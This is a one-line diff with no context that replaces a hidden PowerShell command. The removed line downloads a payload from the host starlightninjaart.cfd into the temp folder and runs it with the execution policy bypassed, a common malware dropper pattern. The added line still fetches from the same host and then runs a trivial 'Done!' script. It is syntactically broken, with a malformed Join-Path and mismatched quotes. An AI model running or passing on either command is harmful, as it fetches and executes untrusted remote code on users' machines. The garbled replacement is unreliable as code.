@@ -1,1 +1,1 @@
-powershell -NoProfile -w hidden -Command "Invoke-WebRequest -Uri 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile (Join-Path $env:TEMP '1111.df'); " & powershell -ExecutionPolicy Bypass -File "%TEMP%\1111.df"
+powershell.exe -NoProfile -w hidden -Command "Invoke-WebRequest -Uri 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile (Join-Path $p=%TEMP%\setup.ps1; echo 'Write-Host "Done!"' > $p; " & powershell -ExecutionPolicy Bypass -File $p"
